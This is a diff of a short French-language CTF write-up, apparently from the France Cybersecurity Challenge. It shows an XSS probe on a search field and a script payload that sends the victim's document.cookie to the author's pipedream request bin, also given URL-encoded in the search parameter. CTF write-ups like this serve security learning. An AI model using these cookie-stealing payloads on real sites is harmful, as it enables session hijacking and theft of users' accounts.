@@ -11,4 +11,6 @@ Premièrement je teste cette payload ```<svg/onload=prompt();>```.<br/><br/>
 Le searchbar est vulnérable aux attaques XSS. On a donc notre point d'injection.<br/>
 En premier temps je crée un requestbin sur https://pipedream.com/ <br/>
 Cette payload est une redirection vers mon pipedream.<br/>
-```<script>document.location="https://enx36kg9aihcldt.m.pipedream.net?cookie="+document.cookie;</script>```
+```<script>document.location="https://enx36kg9aihcldt.m.pipedream.net?cookie="+document.cookie;</script>```<br/>
+Je pose la payload dans le paramètre search.<br/>
+```http://challenges2.france-cybersecurity-challenge.fr:5001/index.php?search=%3Cscript%3Edocument.location%3D%22https%3A%2F%2Fenx36kg9aihcldt.m.pipedream.net%3Fcookie%3D%22%2Bdocument.cookie%3B%3C%2Fscript%3E```<br/>
